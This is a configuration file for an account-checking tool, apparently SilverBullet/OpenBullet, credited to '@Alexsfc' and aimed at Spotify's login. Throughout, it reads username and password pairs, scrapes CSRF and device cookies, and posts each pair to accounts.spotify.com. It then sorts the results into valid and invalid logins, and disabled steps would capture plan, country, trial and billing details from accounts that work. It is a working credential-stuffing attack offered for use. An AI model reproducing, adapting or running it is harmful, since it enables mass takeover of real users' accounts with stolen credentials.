[SETTINGS]
{
  "Name": "[Spotify] @Alexsfc",
  "SuggestedBots": 100,
  "MaxCPM": 0,
  "LastModified": "2024-06-10T09:53:38.8218147+02:00",
  "AdditionalInfo": "",
  "RequiredPlugins": [],
  "Author": "@Alexsfc",
  "Version": "1.1.4 [SB]",
  "SaveEmptyCaptures": false,
  "ContinueOnCustom": false,
  "SaveHitsToTextFile": false,
  "IgnoreResponseErrors": false,
  "MaxRedirects": 8,
  "NeedsProxies": false,
  "OnlySocks": false,
  "OnlySsl": false,
  "MaxProxyUses": 0,
  "BanProxyAfterGoodStatus": false,
  "BanLoopEvasionOverride": -1,
  "EncodeData": false,
  "AllowedWordlist1": "",
  "AllowedWordlist2": "",
  "DataRules": [],
  "CustomInputs": [],
  "CaptchaUrl": "",
  "IsBase64": false,
  "FilterList": [],
  "EvaluateMathOCR": false,
  "SecurityProtocol": 0,
  "ForceHeadless": false,
  "AlwaysOpen": false,
  "AlwaysQuit": false,
  "QuitOnBanRetry": false,
  "AcceptInsecureCertificates": true,
  "DisableNotifications": false,
  "DisableImageLoading": false,
  "DefaultProfileDirectory": false,
  "CustomUserAgent": "",
  "RandomUA": false,
  "CustomCMDArgs": "",
  "Title": "[Spotify] @Alexsfc",
  "IconPath": "Icon\\svbfile.ico",
  "LicenseSource": null,
  "Message": null,
  "MessageColor": "#FFFFFFFF",
  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
  "AuthorColor": "#FFFFB266",
  "WordlistColor": "#FFB5C2E1",
  "BotsColor": "#FFA8FFFF",
  "CustomInputColor": "#FFD6C7C7",
  "CPMColor": "#FFFFFFFF",
  "ProgressColor": "#FFAD93E3",
  "HitsColor": "#FF66FF66",
  "CustomColor": "#FFFFB266",
  "ToCheckColor": "#FF7FFFD4",
  "FailsColor": "#FFFF3333",
  "RetriesColor": "#FFFFFF99",
  "OcrRateColor": "#FF4698FD",
  "ProxiesColor": "#FFFFFFFF"
}

[SCRIPT]
#US FUNCTION URLEncode "<USER>" -> VAR "US" 

#PAS FUNCTION URLEncode "<PASS>" -> VAR "PAS" 

#UID FUNCTION GenerateGUID -> VAR "UID" 

#GET_CK REQUEST GET "https://accounts-gue1.spotify.com/floss/start/05-401deaa9-010d-4ae3-a9e2-d26187093d5e;1;f0855d8a-aeea-4adb-9a58-f9f0d27eb632" 
  
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

#hst PARSE "<COOKIES>" LR "__Host-state," ")" -> VAR "hst" 

#did PARSE "<COOKIES>" LR "__Host-device_id," ")" -> VAR "did" 

#csrf PARSE "<COOKIES>" LR "sp_sso_csrf_token," ")" -> VAR "csrf" 

#csrfid PARSE "<COOKIES>" LR "__Host-sp_csrf_sid," ")" -> VAR "csrfid" 

#LEN FUNCTION Length "username=<US>&password=<PAS>&remember=true&continue=https%3A%2F%2Faccounts-gue1.spotify.com%2Ffloss%2Fcomplete%2F05-401deaa9-010d-4ae3-a9e2-d26187093d5e%3B2%3B044e1130-1a91-4b3c-814a-a8cdaa19db04%3Fstate%3D3-U4aKVH3XRWSij_OZXIEEpFeZxQg8esnqOyWlbUGTPwI2gdjSbM41lmMYRK7oJ7wq4UJOtSCN7pvTSCL0iEIw%26flow_ctx%3Df80afa0b-af40-4765-ab13-429aec3d8545%253A1707078938&listenerAppExperiment=true&flowCtx=<UID>%3A1707078938" -> VAR "LEN" 

#POST_LOGIN REQUEST POST "https://accounts.spotify.com/login/password" 
  CONTENT "username=<US>&password=<PAS>&remember=true&continue=https%3A%2F%2Faccounts-gue1.spotify.com%2Ffloss%2Fcomplete%2F05-401deaa9-010d-4ae3-a9e2-d26187093d5e%3B2%3B044e1130-1a91-4b3c-814a-a8cdaa19db04%3Fstate%3D3-U4aKVH3XRWSij_OZXIEEpFeZxQg8esnqOyWlbUGTPwI2gdjSbM41lmMYRK7oJ7wq4UJOtSCN7pvTSCL0iEIw%26flow_ctx%3Df80afa0b-af40-4765-ab13-429aec3d8545%253A1707078938&listenerAppExperiment=true&flowCtx=<UID>" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "Accept: application/json" 
  HEADER "Accept-Encoding: gzip, deflate, br" 
  HEADER "Connection: keep-alive" 
  HEADER "Content-Length: 481" 
  HEADER "Content-Type: application/x-www-form-urlencoded" 
  HEADER "Cookie: __Host-device_id=<did>; __Secure-TPASESSION=AQD6RcNzHjvL3S7Q0asg3rxTqExDU7O6JzCx5VaEgsTD0m3RTs/rOjKb/rA9I9KzAQjgti6qCiGb7ML31N2+KPdXqXINIzR48tU=; sp_tr=false; sp_sso_csrf_token=<csrf>; __Host-sp_csrf_sid=<csrfid>; remember=<US>" 
  HEADER "Host: accounts.spotify.com" 
  HEADER "Origin: https://accounts.spotify.com" 
  HEADER "Referer: https://accounts.spotify.com/pt-BR/login?method=password&signup=none&nolinks=1&client_id=9a8d2f0ce77a4e248bb71fefcb557637&continue=https%3A%2F%2Faccounts-gue1.spotify.com%2Ffloss%2Fcomplete%2F05-401deaa9-010d-4ae3-a9e2-d26187093d5e%3B2%3B044e1130-1a91-4b3c-814a-a8cdaa19db04&listener_app=1&max_age=0&state=3-U4aKVH3XRWSij_OZXIEEpFeZxQg8esnqOyWlbUGTPwI2gdjSbM41lmMYRK7oJ7wq4UJOtSCN7pvTSCL0iEIw&flow_ctx=f80afa0b-af40-4765-ab13-429aec3d8545%3A1707078938" 
  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; G011A Build/PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36" 
  HEADER "X-CSRF-Token: <csrf>" 

#VALIDA_RESULTADOS KEYCHECK 
  KEYCHAIN Success OR 
    KEY "\"result\":\"" 
  KEYCHAIN Failure OR 
    KEY "{\"error\":\"errorInvalidCredentials\"}" 
    KEY "<RESPONSECODE>" Contains "400" 

!REQUEST GET "https://www.spotify.com/br-pt/api/account/v1/datalayer/" 
!  
!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
!  HEADER "Pragma: no-cache" 
!  HEADER "Accept: */*" 

!KEYCHECK BanOnToCheck=FALSE 
!  KEYCHAIN Custom "FREE" OR 
!    KEY "free" 
!  KEYCHAIN Success OR 
!    KEY "isTrialUser\":false," 
!  KEYCHAIN Custom "CUSTOM" OR 
!    KEY "isTrialUser\":true," 

!PARSE "<SOURCE>" JSON "isTrialUser" CreateEmpty=FALSE -> CAP "isTrialUser" 

!PARSE "<SOURCE>" JSON "currentPlan" CreateEmpty=FALSE -> CAP "Plan" 

!PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "country" 

!PARSE "<SOURCE>" JSON "daysLeft" CreateEmpty=FALSE -> CAP "daysLeft" 

!PARSE "<SOURCE>" JSON "value" CreateEmpty=FALSE -> CAP "value" 

!PARSE "<SOURCE>" LR "nextBillingInfo" "" CreateEmpty=FALSE -> CAP "nextBillingInfo" 

FUNCTION Constant "@Alexsfc" -> CAP "Config By" 

